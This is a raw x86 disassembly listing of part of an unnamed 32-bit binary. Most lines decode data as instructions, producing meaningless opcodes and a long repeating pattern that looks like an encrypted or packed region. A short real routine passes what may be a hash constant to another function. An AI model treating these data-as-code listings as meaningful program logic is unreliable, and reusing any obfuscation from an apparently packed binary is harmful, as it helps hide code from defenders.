  422c21:	xor    dl,BYTE PTR [ebx]
  422c23:	bound  esp,QWORD PTR [ebp-0x67]
  422c26:	pushf  
  422c27:	inc    edx
  422c28:	xchg   edi,eax
  422c29:	dec    ebp
  422c2a:	test   DWORD PTR ss:[ebx+eiz*4-0xabf8bda],esp
  422c32:	push   edi
  422c33:	std    
  422c34:	push   es
  422c35:	aaa    
  422c36:	icebp  
  422c37:	int3   
  422c38:	(bad)  
  422c39:	jl     0x422c5a
  422c3b:	jo     0x422bdd
  422c3d:	fsubr  st(1),st
  422c3f:	or     al,0x41
  422c41:	push   ebx
  422c42:	xor    eax,0x6472b8ce
  422c47:	sub    BYTE PTR [edi+ebp*4],al
  422c4a:	fidiv  DWORD PTR [ecx-0xc]
  422c4d:	jle    0x422c34
  422c4f:	dec    ebp
  422c50:	in     eax,0xac
  422c52:	cld    
  422c53:	and    eax,0x391c4c31
  422c58:	int    0x59
  422c5a:	ins    DWORD PTR es:[edi],dx
  422c5b:	or     al,0x61
  422c5d:	sub    eax,esi
  422c5f:	sub    dl,BYTE PTR [ebx+0x3be36ccd]
  422c65:	push   ebp
  422c66:	(bad)  
  422c67:	cmp    BYTE PTR [ebx-0x1d],al
  422c6a:	xor    cl,ah
  422c6c:	inc    edx
  422c6d:	out    0x61,eax
  422c6f:	dec    ebp
  422c70:	rcl    BYTE PTR [eax],cl
  422c72:	pop    ebx
  422c73:	adc    eax,0x93551d7d
  422c78:	test   eax,0x5f09917e
  422c7d:	mov    eax,0x9ee0135
  422c82:	sar    DWORD PTR [ebx-0x7af1b589],1
  422c88:	pop    edi
  422c89:	and    eax,0x42703ad9
  422c8e:	cmp    eax,0x471d5da8
  422c93:	addr16 fwait
  422c95:	sar    DWORD PTR [edx],1
  422c97:	bound  edx,QWORD PTR [edx]
  422c99:	clc    
  422c9a:	xchg   ebp,eax
  422c9b:	int3   
  422c9c:	mov    BYTE PTR [ebx-0x79fb0ae2],bl
  422ca2:	jmp    0x422c6d
  422ca4:	and    eax,0x6bb56ec0
  422ca9:	adc    edi,DWORD PTR [eax]
  422cab:	fiadd  DWORD PTR [edx]
  422cad:	(bad)  
  422cae:	jo     0x422cbc
  422cb0:	cmp    eax,0xef3e5b24
  422cb5:	sub    BYTE PTR [eax+esi*2-0x5e],al
  422cb9:	stos   BYTE PTR es:[edi],al
  422cba:	cmp    eax,0x61c92d1a
  422cbf:	pop    ebp
  422cc0:	mov    ebx,0xcec42926
  422cc5:	jns    0x422c6a
  422cc7:	push   edi
  422cc8:	jne    0x422d26
  422cca:	mov    eax,ds:0x8ba005a0
  422ccf:	add    al,dl
  422cd1:	xor    eax,0x12b555e8
  422cd6:	pushf  
  422cd7:	adc    al,0x5b
  422cd9:	mov    BYTE PTR [edx-0x4b],0x1d
  422cdd:	cwde   
  422cde:	ss aad 0xf6
  422ce1:	ja     0x422c6b
  422ce3:	clc    
  422ce4:	and    al,0x9d
  422ce6:	js     0x422cde
  422ce8:	(bad)  
  422ce9:	les    esp,FWORD PTR [esi+0x660bc2dd]
  422cef:	retf   0x2a56
  422cf2:	mov    ds:0x58349d17,al
  422cf7:	pop    ebp
  422cf8:	data16 or BYTE PTR [eax],0x3c
  422cfc:	mov    esp,0x1519fdbe
  422d01:	add    eax,0xffffffc5
  422d04:	xor    al,0x3e
  422d06:	call   0xb84c:0xc239b1a3
  422d0d:	(bad)  
  422d0e:	popa   
  422d0f:	sbb    al,0x7e
  422d11:	jmp    0x422d1b
  422d13:	push   es
  422d14:	lock stos DWORD PTR es:[edi],eax
  422d16:	jg     0x422cb6
  422d18:	aas    
  422d19:	and    eax,DWORD PTR [eax+edi*1-0x1056984d]
  422d20:	cmp    al,0xf2
  422d22:	lds    ebx,FWORD PTR [edi+edx*2+0x3c6c1cbb]
  422d29:	cmc    
  422d2a:	push   0x2ee4a68f
  422d2f:	push   es
  422d30:	addr16 jns 0x422da5
  422d33:	push   ds
  422d34:	mov    cl,0x7c
  422d36:	or     eax,0xcd5e2904
  422d3b:	in     eax,dx
  422d3c:	cmc    
  422d3d:	inc    edx
  422d3e:	fwait
  422d3f:	xchg   BYTE PTR [ecx],dl
  422d41:	xchg   BYTE PTR [ebx+0x24f49f2f],dl
  422d47:	xchg   DWORD PTR [edx+0x412d2837],eax
  422d4d:	xchg   edi,eax
  422d4e:	dec    ebp
  422d4f:	xchg   ebx,eax
  422d50:	dec    ebp
  422d51:	cli    
  422d52:	je     0x422d3e
  422d54:	shl    BYTE PTR ds:0x8949965f,1
  422d5a:	add    dl,BYTE PTR [ebp-0x4a84fb5c]
  422d60:	cdq    
  422d61:	rcr    BYTE PTR [ebx+esi*1],cl
  422d64:	dec    edi
  422d65:	ret    
  422d66:	fwait
  422d67:	push   es
  422d68:	inc    esi
  422d69:	mov    WORD PTR [edi+0x2e],?
  422d6c:	mov    al,ds:0x7f572b01
  422d71:	jo     0x422dba
  422d73:	jmp    0x422dce
  422d75:	cli    
  422d76:	and    DWORD PTR [ecx],0x71
  422d79:	into   
  422d7a:	jmp    0x422dc6
  422d7c:	jnp    0x422d94
  422d7e:	xchg   ecx,esi
  422d80:	jl     0x422d69
  422d82:	(bad)  
  422d83:	lds    eax,FWORD PTR [ebp+0x265cc511]
  422d89:	cld    
  422d8a:	jg     0x422d5c
  422d8c:	cmp    cl,BYTE PTR [ebp+ebp*2-0x469336a7]
  422d93:	mov    BYTE PTR [ecx],cl
  422d95:	jbe    0x422dd3
  422d97:	inc    ebx
  422d98:	or     ecx,DWORD PTR [ecx-0xf74b770]
  422d9e:	cwde   
  422d9f:	add    DWORD PTR [esi],esi
  422da1:	mov    WORD PTR [esi+0x51473f8],ss
  422da7:	fmul   QWORD PTR ds:0x359447bf
  422dad:	mov    dl,bl
  422daf:	xchg   DWORD PTR [edx],edx
  422db1:	xchg   edi,eax
  422db2:	out    0xdb,al
  422db4:	outs   dx,DWORD PTR ds:[esi]
  422db5:	outs   dx,DWORD PTR ds:[esi]
  422db6:	xor    BYTE PTR [eax+0x52],ch
  422db9:	ins    DWORD PTR es:[edi],dx
  422dba:	mov    ds:0x492a75f0,al
  422dbf:	lea    esi,[ebx]
  422dc1:	shr    BYTE PTR [ecx+0x72],cl
  422dc4:	jns    0x422dfd
  422dc6:	sub    BYTE PTR [ecx-0x2a1a560],cl
  422dcc:	(bad)
  422dd0:	cli    
  422dd1:	jp     0x422df1
  422dd3:	test   BYTE PTR [ebx+0x52d918ba],dl
  422dd9:	add    al,0x23
  422ddb:	xor    ch,bl
  422ddd:	jae    0x422d62
  422ddf:	sbb    eax,0x4ebae1f4
  422de4:	sub    DWORD PTR [edx],esp
  422de6:	cmp    al,0x66
  422de8:	jl     0x422d88
  422dea:	sbb    eax,0xa6d04dd6
  422def:	sub    DWORD PTR [ecx+0x70],eax
  422df2:	clc    
  422df3:	xchg   BYTE PTR [ebp+0x79b42659],bl
  422df9:	iret   
  422dfa:	sub    al,0xee
  422dfc:	add    BYTE PTR [ebp-0x10],bl
  422dff:	sahf   
  422e00:	les    ebp,FWORD PTR [ebp+0x53]
  422e03:	xchg   esi,eax
  422e04:	(bad)  
  422e05:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e07:	xor    al,0x26
  422e09:	xchg   ecx,eax
  422e0a:	gs pop es
  422e0c:	imul   eax,DWORD PTR [ebx],0x5
  422e0f:	iret   
  422e10:	pop    edi
  422e11:	in     al,dx
  422e12:	pop    ecx
  422e13:	int3   
  422e14:	xor    al,0x38
  422e16:	test   DWORD PTR [eax],edi
  422e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e19:	dec    eax
  422e1a:	sti    
  422e1b:	jae    0x422d9d
  422e1d:	mov    ds:0x54b85358,al
  422e22:	and    eax,0x74fc65cc
  422e27:	xlat   BYTE PTR ds:[ebx]
  422e28:	sbb    al,0x5
  422e2a:	push   0x845dbe93
  422e2f:	sti    
  422e30:	(bad)  
  422e31:	mov    ebp,0x39fcbdf6
  422e36:	adc    DWORD PTR [ebx],ecx
  422e38:	xor    ebx,ecx
  422e3a:	arpl   WORD PTR [edx-0x1b],bx
  422e3d:	and    al,0x5e
  422e3f:	xchg   ecx,eax
  422e40:	outs   dx,BYTE PTR ds:[esi]
  422e41:	dec    ecx
  422e42:	dec    eax
  422e43:	mov    ds:0x27822724,al
  422e48:	hlt    
  422e49:	or     ebx,ecx
  422e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e4c:	jne    0x422e56
  422e4e:	or     eax,0xabf5009b
  422e53:	fidivr DWORD PTR [esi+0x56]
  422e56:	shl    DWORD PTR [esi-0x55],0xed
  422e5a:	cdq    
  422e5b:	ds inc esi
  422e5d:	fs in  al,0xde
  422e60:	sub    al,dh
  422e62:	out    0xcf,al
  422e64:	jecxz  0x422e06
  422e66:	int    0x87
  422e68:	push   edi
  422e69:	and    DWORD PTR [eax+ebp*4-0x5d3f9280],0x42
  422e71:	es add al,ch
  422e74:	jmp    DWORD PTR [esi+0x441c9b31]
  422e7a:	mov    ebx,0x953bacf9
  422e7f:	mov    esi,0x268eed9f
  422e84:	call   0x2945:0x5a348f24
  422e8b:	jp     0x422e20
  422e8d:	add    BYTE PTR [eax],bh
  422e8f:	xchg   BYTE PTR [ebp-0x4ca03804],al
  422e95:	leave  
  422e96:	ret    
  422e97:	jg     0x422e93
  422e99:	lahf   
  422e9a:	mov    cl,0x9c
  422e9c:	nop
  422e9d:	adc    al,BYTE PTR [ecx-0x9]
  422ea0:	mov    bl,BYTE PTR [ecx]
  422ea2:	xor    al,0xa1
  422ea4:	mov    ebp,0x9a45144f
  422ea9:	ins    BYTE PTR es:[edi],dx
  422eaa:	adc    DWORD PTR [ecx],edi
  422eac:	add    ebx,edx
  422eae:	loopne 0x422ea4
  422eb0:	in     eax,dx
  422eb1:	fnsave [ebx+0x2d95542e]
  422eb7:	push   es
  422eb8:	cld    
  422eb9:	(bad)  
  422eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ebb:	retf   0x28d8
  422ebe:	(bad)  
  422ebf:	loope  0x422f24
  422ec1:	data16 mov ch,0x32
  422ec4:	or     al,BYTE PTR [esi+0x38bc64b7]
  422eca:	inc    esp
  422ecb:	fcomp  st(2)
  422ecd:	ret    0x8089
  422ed0:	nop
  422ed1:	xchg   DWORD PTR [ecx],ecx
  422ed3:	je     0x422eb4
  422ed5:	(bad)  
  422ed6:	dec    edx
  422ed7:	dec    ebx
  422ed8:	dec    ebx
  422ed9:	sub    BYTE PTR [edi+edi*1+0x7f],bh
  422edd:	ds call 0x33cc36ab
  422ee3:	add    dl,BYTE PTR [ebx]
  422ee5:	lock fwait
  422ee7:	imul   esi,esi,0xfffffffc
  422eea:	jb     0x422f1b
  422eec:	jb     0x422f4e
  422eee:	ficomp DWORD PTR [edi-0xc]
  422ef1:	mov    ebp,0xf7df9bb6
  422ef6:	xor    DWORD PTR [eax-0x2d4779b9],eax
  422efc:	fimul  DWORD PTR [ecx]
  422efe:	push   0x2
  422f00:	adc    ah,BYTE PTR [eax-0x3cbd8e03]
  422f06:	test   ch,cl
  422f08:	adc    ecx,esi
  422f0a:	sub    ebp,edx
  422f0c:	pop    ebx
  422f0d:	push   es
  422f0e:	scas   al,BYTE PTR es:[edi]
  422f0f:	push   esp
  422f10:	dec    ecx
  422f11:	push   ecx
  422f12:	sbb    esi,DWORD PTR [esi]
  422f14:	icebp  
  422f15:	ja     0x422f32
  422f17:	std    
  422f18:	outs   dx,DWORD PTR ds:[esi]
  422f19:	rcr    DWORD PTR ds:0x1b853ec,1
  422f1f:	add    BYTE PTR [eax],al
  422f21:	add    BYTE PTR [ebx-0x333ca21b],cl
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0xc0ea8112
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	call   FWORD PTR [edx+0x20]
  422fc5:	dec    edx
  422fc6:	adc    bl,BYTE PTR [edx+0x3d3e0516]
  422fcc:	stc    
  422fcd:	xchg   esi,eax
  422fce:	call   0x99aa:0xda7ae894
  422fd5:	push   ss
  422fd6:	add    eax,0x96f9393e
  422fdb:	fisubr DWORD PTR [ebx+0x17]
  422fde:	jp     0x422fba
  422fe0:	adc    bl,BYTE PTR [ecx+0x393e0516]
  422fe6:	stc    
  422fe7:	xchg   esi,eax
  422fe8:	call   0x9912:0xda7a176b
  422fef:	push   ss
  422ff0:	add    eax,0x96f9393e
  422ff5:	call   0x9912:0xda7a176b
  422ffc:	push   ss
  422ffd:	add    eax,0x96f9c13e
  423002:	call   0x2d12:0xd4c00865
  423009:	pop    ds
  42300a:	enter  0x811f,0xf8
  42300e:	ficom  DWORD PTR [edi+0x4a]
  423011:	inc    ebx
  423012:	adc    dh,BYTE PTR [ebx+0x7766b961]
  423018:	push   ecx
  423019:	pop    esi
  42301a:	mov    esi,edi
  42301c:	test   DWORD PTR [ebx+0x74],0xf67cb41b
  423023:	bound  esp,QWORD PTR ds:0xe4d95c5c
  423029:	out    dx,eax
  42302a:	add    eax,0x32b41337
  42302f:	fstp   QWORD PTR [ecx+0x56]
  423032:	push   ds
  423033:	push   esp
  423034:	xchg   esi,eax
  423035:	repnz inc DWORD PTR [ebp+0x1a]
  423039:	ja     0x42300b
  42303b:	ss cdq 
  42303d:	push   ss
  42303e:	add    eax,0x96f9393e
  423043:	popf   
  423044:	bnd jmp 0x42306a
  423047:	cdq    
  423048:	jmp    0xf3ab:0xc6461c0b
  42304f:	aad    0x62
  423051:	stc    
  423052:	sbb    eax,0x931ebf22
  423057:	dec    ecx
  423058:	std    
  423059:	lods   al,BYTE PTR ds:[esi]
  42305a:	xor    esp,DWORD PTR [ecx-0x2a9e5d0d]
  423060:	or     BYTE PTR [eax+0x18],0xc1
  423064:	jae    0x4230a2
  423066:	xor    al,0x51
  423068:	add    DWORD PTR [eax+edx*4],eax
  42306b:	inc    edi
  42306c:	cdq    
  42306d:	inc    ebx
  42306e:	rcl    BYTE PTR [ecx+eiz*2-0x7c],1
  423072:	pcmpeqb mm7,QWORD PTR [ecx-0x6c2f6318]
  423079:	test   DWORD PTR [eax-0x70],esi
  42307c:	xchg   edx,eax
  42307d:	cwde   
  42307e:	sbb    al,0x5d
  423080:	(bad)  
  423081:	stos   DWORD PTR es:[edi],eax
  423082:	repz aad 0x62
  423085:	clc    
  423086:	sbb    eax,0x93802352
  42308b:	test   eax,0xb433bedd
  423090:	outs   dx,BYTE PTR ds:[esi]
  423091:	or     BYTE PTR [ecx+0x4f],ah
  423094:	pop    ds
  423095:	out    0x18,eax
  423097:	xchg   ecx,eax
  423098:	out    dx,al
  423099:	xchg   edi,eax
  42309a:	xor    al,0x61
  42309c:	pushf  
  42309d:	sahf   
  42309e:	nop
  42309f:	sub    edi,ebp
  4230a1:	call   0x1a3e7b76
  4230a6:	(bad)  
  4230a8:	shr    DWORD PTR [ebx-0x64],0xc8
  4230ac:	add    dh,BYTE PTR [edx+edx*1-0x67]
  4230b0:	jmp    0xf939:0x3e051c0b
  4230b7:	xchg   esi,eax
  4230b8:	call   0x9912:0x9f2a176b
  4230bf:	pop    edx
  4230c0:	add    al,0x3c
  4230c2:	cmp    DWORD PTR ds:0x1724c575,edx
  4230c8:	jp     0x4230a4
  4230ca:	adc    bl,BYTE PTR [ecx-0x26c1faea]
  4230d0:	stc    
  4230d1:	xchg   ebp,eax
  4230d2:	fwait
  4230d3:	pusha  
  4230d4:	push   ss
  4230d5:	jo     0x4230b1
  4230d7:	adc    dh,BYTE PTR [ebp+0x12]
  4230da:	add    eax,0x96ff3d3e
  4230df:	call   0x99af:0xdb7a176b
  4230e6:	push   ss
  4230e7:	add    eax,0x96f9392e
  4230ec:	call   0x9953:0xda7a176e
  4230f3:	push   ss
  4230f4:	adc    eax,0x94f9393e
  4230f9:	call   0x9912:0xdb7a126b
  423100:	push   ss
  423101:	add    eax,0x97f93c3e
  423106:	call   0x1912:0xda7a176b
  42310d:	sbb    eax,0xf93d3e05
  423112:	xchg   esi,eax
  423113:	daa    
  423114:	pop    edx
  423115:	adc    bh,BYTE PTR [edx-0x28]
  423118:	adc    bl,BYTE PTR [ecx+0x293e0596]
  42311e:	stc    
  42311f:	xchg   esi,eax
  423120:	mov    ch,BYTE PTR [ebx+0x17]
  423123:	jp     0x4230ff
  423125:	add    bl,BYTE PTR [ecx+0x393e1516]
  42312b:	stc    
  42312c:	xchg   esi,eax
  42312d:	call   0x9912:0xda7a076b
  423134:	push   ss
  423135:	add    eax,0x96f9393e
  42313a:	call   0x9a7b:0xda7179ef
  423141:	push   ss
  423142:	add    eax,0x96f2093e
  423147:	push   ebp
  423148:	push   esi
  423149:	pop    ss
  42314a:	jp     0x423126
  42314c:	adc    bl,BYTE PTR [ecx+0x393e0516]
  423152:	stc    
  423153:	xchg   esi,eax
  423154:	call   0x9912:0xda7a176b
  42315b:	push   ss
  42315c:	add    eax,0x96f9393e
  423161:	call   0x9912:0xda7a176b
  423168:	push   ss
  423169:	add    eax,0x96f9393e
  42316e:	call   0x9912:0xda7a176b
  423175:	push   ss
  423176:	add    eax,0x96f9393e
  42317b:	call   0x9912:0xda7a176b
  423182:	push   ss
  423183:	add    eax,0x96f9393e
  423188:	call   0x9912:0xda7a176b
  42318f:	push   ss
  423190:	add    eax,0x96f9393e
  423195:	call   0x9912:0xda7a176b
  42319c:	push   ss
  42319d:	add    eax,0x96f9393e
  4231a2:	call   0x9912:0xda7a176b
  4231a9:	push   ss
  4231aa:	add    eax,0x96f9393e
  4231af:	call   0xfc66:0xf47a176b
  4231b6:	outs   dx,BYTE PTR ds:[esi]
  4231b7:	jno    0x4231f7
  4231b9:	cmp    ecx,edi
  4231bb:	xchg   esi,eax
  4231bc:	mov    edx,0xca7a1760
  4231c1:	adc    bl,BYTE PTR [ecx+0x393a3f16]
  4231c7:	stc    
  4231c8:	xchg   edx,eax
  4231c9:	call   0xcd20:0x993f476b
  4231d0:	pop    ecx
  4231d1:	add    eax,0x96f9393e
  4231d6:	call   0xeb3c:0x3a7a174b
  4231dd:	gs ja  0x42323d
  4231e0:	cmp    ecx,edi
  4231e2:	xchg   esi,eax
  4231e3:	call   0x9222:0xda7a173b
  4231ea:	push   ss
  4231eb:	add    eax,0x96f9396e
  4231f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231f1:	outs   dx,DWORD PTR ds:[esi]
  4231f2:	pop    ss
  4231f3:	jp     0x4231cf
  4231f5:	adc    bl,BYTE PTR [ecx+0x393e0516]
  4231fb:	stc    
  4231fc:	xchg   esi,eax
  4231fd:	call   0x99f2:0xda7a376b
  423204:	push   ss
  423205:	add    eax,0x96f9393e
  42320a:	call   0x9912:0xda7a176b
  423211:	push   ss
  423212:	add    eax,0x96f9393e
  423217:	call   0x9912:0xda7a176b
  42321e:	push   ss
  42321f:	add    eax,0x96f9393e
  423224:	call   0x9912:0xda7a176b
  42322b:	push   ss
  42322c:	add    eax,0x96f9393e
  423231:	call   0x9912:0xda7a176b
  423238:	push   ss
  423239:	add    eax,0x96f9393e
  42323e:	call   0x9912:0xda7a176b
  423245:	push   ss
  423246:	add    eax,0x96f9393e
  42324b:	call   0x9912:0xda7a176b
  423252:	push   ss
  423253:	add    eax,0x96f9393e
  423258:	call   0x9912:0xda7a176b
  42325f:	push   ss
  423260:	add    eax,0x96f9393e
  423265:	call   0x9912:0xda7a176b
  42326c:	push   ss
  42326d:	add    eax,0x96f9393e
  423272:	call   0x9912:0xda7a176b
  423279:	push   ss
  42327a:	add    eax,0x96f9393e
  42327f:	call   0x9912:0xda7a176b
  423286:	push   ss
  423287:	add    eax,0x96f9393e
  42328c:	call   0x9912:0xda7a176b
  423293:	push   ss
  423294:	add    eax,0x96f9393e
  423299:	call   0x9912:0xda7a176b
  4232a0:	push   ss
  4232a1:	add    eax,0x96f9393e
  4232a6:	call   0x9912:0xda7a176b
  4232ad:	push   ss
  4232ae:	add    eax,0x96f9393e
  4232b3:	call   0x9912:0xda7a176b
  4232ba:	push   ss
  4232bb:	add    eax,0x96f9393e
  4232c0:	call   0x9912:0xda7a176b
  4232c7:	push   ss
  4232c8:	add    eax,0x96f9393e
  4232cd:	call   0x9912:0xda7a176b
  4232d4:	push   ss
  4232d5:	add    eax,0x96f9393e
  4232da:	call   0x9912:0xda7a176b
  4232e1:	push   ss
  4232e2:	add    eax,0x96f9393e
  4232e7:	call   0x9912:0xda7a176b
  4232ee:	push   ss
  4232ef:	add    eax,0x96f9393e
  4232f4:	call   0x9912:0xda7a176b
  4232fb:	push   ss
  4232fc:	add    eax,0x96f9393e
  423301:	call   0x9912:0xda7a176b
  423308:	push   ss
  423309:	add    eax,0x96f9393e
  42330e:	call   0x9912:0xda7a176b
  423315:	push   ss
  423316:	add    eax,0x96f9393e
  42331b:	call   0x9912:0xda7a176b
  423322:	push   ss
  423323:	add    eax,0x96f9393e
  423328:	call   0x9912:0xda7a176b
  42332f:	push   ss
  423330:	add    eax,0x96f9393e
  423335:	call   0x9912:0xda7a176b
  42333c:	push   ss
  42333d:	add    eax,0x96f9393e
  423342:	call   0x9912:0xda7a176b
  423349:	push   ss
  42334a:	add    eax,0x96f9393e
  42334f:	call   0x9912:0xda7a176b
  423356:	push   ss
  423357:	add    eax,0x96f9393e
  42335c:	call   0x9912:0xda7a176b
  423363:	push   ss
  423364:	add    eax,0x96f9393e
  423369:	call   0x9912:0xda7a176b
  423370:	push   ss
  423371:	add    eax,0x96f9393e
  423376:	call   0x9912:0xda7a176b
  42337d:	push   ss
  42337e:	add    eax,0x96f9393e
  423383:	call   0x9912:0xda7a176b
  42338a:	push   ss
  42338b:	add    eax,0x96f9393e
  423390:	call   0x9912:0xda7a176b
  423397:	push   ss
  423398:	add    eax,0x96f9393e
  42339d:	call   0x9912:0xda7a176b
  4233a4:	push   ss
  4233a5:	add    eax,0x96f9393e
  4233aa:	call   0x9912:0xda7a176b
  4233b1:	push   ss
  4233b2:	add    eax,0x96f9393e
  4233b7:	call   0x9912:0xda7a176b
  4233be:	push   ss
  4233bf:	add    eax,0xd1f9393e
  4233c4:	je     0x423427
  4233c6:	pop    ss
  4233c7:	push   ebp
  4233c8:	ficom  DWORD PTR [edx]
  4233ca:	mov    DWORD PTR [esi],edx
  4233cc:	add    eax,0xe7239b14
  4233d1:	cld    
  4233d2:	xchg   esp,eax
  4233d3:	cmp    ah,ah
  4233d5:	pop    ebp
  4233d6:	inc    edx
  4233d7:	je     0x4233f9
  4233d9:	in     eax,dx
  4233da:	sub    eax,0xebf06c8d
  4233df:	out    dx,eax
  4233e0:	dec    ebp
  4233e1:	imul   ebp,DWORD PTR [ebx-0x5b],0xb4e17b8f
  4233e8:	mov    eax,0xfbf8b83f
  4233ed:	sub    BYTE PTR [ebx-0x17],al
  4233f0:	pop    ebp
  4233f1:	sub    BYTE PTR [ecx],al
  4233f3:	daa    
  4233f4:	ds push ds
  4233f6:	pop    esi
  4233f7:	push   ds
  4233f8:	iret   
  4233f9:	cmp    bh,BYTE PTR [edx-0x2d]
  4233fc:	call   0xb4447830
  423401:	pop    esi
  423402:	sub    DWORD PTR [edx+0x7e848bb0],esp
  423408:	(bad)  [esi-0x3dc5dc0b]
  42340e:	mov    bl,0x6d
  423410:	pop    es
  423411:	mov    al,ds:0x788ea6ea
  423416:	jp     0x4233f3
  423418:	popf   
  423419:	cmp    DWORD PTR [ecx+eax*1+0x25],0xc52b8b8c
  423421:	shl    cl,0x2
  423424:	push   ebp
  423425:	rcr    DWORD PTR [edx],cl
  423427:	dec    esp
  423428:	xor    edx,DWORD PTR [ebp+0x43]
  42342b:	sbb    al,0x97
  42342d:	and    ebp,ecx
  42342f:	pushf  
  423430:	sub    eax,0x5373932f
  423435:	mov    dl,bh
  423437:	addr16 push esi
  423439:	cli    
  42343a:	mov    ebp,0xf03e395c
  42343f:	jo     0x423407
  423441:	dec    esi
  423442:	mov    ebp,0x9e36d2e1
  423447:	sbb    BYTE PTR [esp+eiz*8+0x644ef09e],0x26
  42344f:	cmp    DWORD PTR [edx+ebp*1],edx
  423452:	inc    esi
  423453:	mov    ebx,0xe4324d0e
  423458:	inc    ebx
  423459:	sbb    bl,dl
  42345b:	inc    esi
  42345c:	jmp    0xd5a1:0x407efbd2
  423463:	sub    dh,bh
  423465:	xor    al,0xd7
  423467:	mov    al,ds:0x3add433e
  42346c:	sub    DWORD PTR [edi],ebx
  42346e:	cmp    ecx,DWORD PTR [ecx+0x2839e819]
  423474:	loope  0x423460
  423476:	ret    
  423477:	rcr    BYTE PTR [esi],0x65
  42347a:	adc    al,0xa0
  42347c:	dec    ebp
  42347d:	adc    dh,bh
  42347f:	js     0x42341e
  423481:	in     al,dx
  423482:	mov    edi,DWORD PTR [ecx-0x41]
  423485:	popa   
  423486:	lods   al,BYTE PTR ds:[esi]
  423487:	add    al,0x9d
  423489:	push   ds
  42348a:	cld    
  42348b:	jae    0x4234a8
  42348d:	dec    esp
  42348e:	fsub   DWORD PTR [esi-0x77d21667]
  423494:	aas    
  423495:	dec    ecx
  423496:	int    0xa2
  423498:	add    DWORD PTR [esi],ebp
  42349a:	lods   eax,DWORD PTR ds:[esi]
  42349b:	and    al,0xe9
  42349d:	pop    ebp
  42349e:	mov    DWORD PTR [esi+0x6c767887],edx
  4234a4:	cs push cs
  4234a6:	inc    eax
  4234a7:	or     BYTE PTR [ebx],bh
  4234a9:	xchg   ebp,eax
  4234aa:	pop    es
  4234ab:	imul   ebp,DWORD PTR [esi+0x12],0x51
  4234af:	mov    eax,0x399da1b1
  4234b4:	ret    0xc185
  4234b7:	mov    ebx,cs
  4234b9:	push   ecx
  4234ba:	and    al,0x41
  4234bc:	xlat   BYTE PTR ds:[ebx]
  4234bd:	adc    al,0x21
  4234bf:	mov    ecx,0x84102241
  4234c4:	jo     0x42346c
  4234c6:	pusha  
  4234c7:	cmc    
  4234c8:	test   BYTE PTR [esi],dl
  4234ca:	adc    al,0xf5
  4234cc:	icebp  
  4234cd:	mov    ecx,0xcdf5356
  4234d2:	pop    edi
  4234d3:	mov    edi,0x80403dd9
  4234d8:	jl     0x423506
  4234da:	xchg   ebx,eax
  4234db:	dec    esi
  4234dc:	mov    BYTE PTR [edi],ch
  4234de:	scas   eax,DWORD PTR es:[edi]
  4234df:	test   al,0xd5
  4234e1:	mov    esp,0xe42c2eca
  4234e6:	xor    eax,0x16f80a05
  4234eb:	cmp    ecx,0xfffffffb
  4234ee:	push   0x6c
  4234f0:	div    BYTE PTR [ebx-0x57]
  4234f3:	cmp    bl,ah
  4234f5:	std    
  4234f6:	bsf    edx,ebx
  4234f9:	sar    BYTE PTR [esp+eax*8+0x70f25262],0x25
  423501:	ds out dx,eax
  423503:	es jo  0x4234da
  423506:	fsub   DWORD PTR [eax-0x3e57939d]
  42350c:	jge    0x4234a8
  42350e:	inc    eax
  42350f:	xor    BYTE PTR [esi-0xb],bh
  423512:	xor    BYTE PTR ds:0xc6df83c5,dh
  423518:	clc    
  423519:	mov    esi,0xe5d2c44f
  42351e:	clc    
  42351f:	inc    eax
  423520:	lahf   
  423521:	or     BYTE PTR [eax],ch
  423523:	ins    DWORD PTR es:[edi],dx
  423524:	inc    edx
  423525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423526:	mov    ebx,0xb57484be
  42352b:	hlt    
  42352c:	or     ah,bl
  42352e:	sbb    DWORD PTR [esi],ebp
  423530:	enter  0x78e3,0xc9
  423534:	inc    ecx
  423535:	(bad)  
  423536:	xchg   edx,eax
  423537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423538:	pop    edx
  423539:	xor    esp,DWORD PTR [ebp-0xbf09816]
  42353f:	lods   al,BYTE PTR ds:[esi]
  423540:	pushf  
  423541:	sub    edx,ebx
  423543:	mov    ecx,0x67213168
  423548:	arpl   WORD PTR [edx-0x64c4f770],bp
  42354e:	jo     0x4235a8
  423550:	std    
  423551:	sub    esi,DWORD PTR [esi+0x21]
  423554:	les    ebp,FWORD PTR [ebx+0x4c]
